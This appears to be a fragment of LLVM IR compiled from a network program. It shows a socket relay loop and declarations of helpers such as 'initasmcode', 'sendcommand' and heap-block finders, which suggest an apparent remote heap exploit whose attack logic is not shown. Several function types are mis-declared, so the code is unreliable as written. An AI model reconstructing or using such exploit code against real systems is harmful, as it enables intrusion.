  store i32 %467, i32* %41, align 4
  %468 = icmp slt i32 %467, 1
  br i1 %468, label %469, label %481

469:                                              ; preds = %464
  %470 = load i64, i64* @errno, align 8
  %471 = load i64, i64* @EWOULDBLOCK, align 8
  %472 = icmp eq i64 %470, %471
  br i1 %472, label %477, label %473

473:                                              ; preds = %469
  %474 = load i64, i64* @errno, align 8
  %475 = load i64, i64* @EAGAIN, align 8
  %476 = icmp eq i64 %474, %475
  br i1 %476, label %477, label %478

477:                                              ; preds = %473, %469
  br label %424

478:                                              ; preds = %473
  %479 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.21, i64 0, i64 0))
  %480 = call i32 @exit(i32 -1) #3
  unreachable

481:                                              ; preds = %464
  %482 = getelementptr inbounds [1024 x i8], [1024 x i8]* %42, i64 0, i64 0
  %483 = load i32, i32* %41, align 4
  %484 = call i32 @write(i32 1, i8* %482, i32 %483)
  br label %485

485:                                              ; preds = %481, %460
  br label %486

486:                                              ; preds = %485, %427
  br label %424

487:                                              ; preds = %424
  br label %488

488:                                              ; preds = %487
  %489 = load i32, i32* %26, align 4
  %490 = add nsw i32 %489, 1
  store i32 %490, i32* %26, align 4
  %491 = load i32, i32* %10, align 4
  %492 = mul nsw i32 %491, 4
  %493 = load i32, i32* @MPTR, align 4
  %494 = add nsw i32 %493, %492
  store i32 %494, i32* @MPTR, align 4
  br label %112

495:                                              ; preds = %112
  %496 = load i32, i32* %3, align 4
  ret i32 %496
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @initasmcode(i8*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @initlookup(...) #1

declare dso_local i32 @sendcommand(i32, i8*, i32) #1

declare dso_local i32 @findblock(i32, i32, i32) #1

declare dso_local i32 @ALLOCBLOCK(i32, i32) #1

declare dso_local i32 @IDX2PTR(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @putaddr(i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @findsblock(i32) #1

declare dso_local i32 @findfblock(i32, i32, i32, i32) #1

declare dso_local i32 @validaddr(i32) #1

declare dso_local i32 @free(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
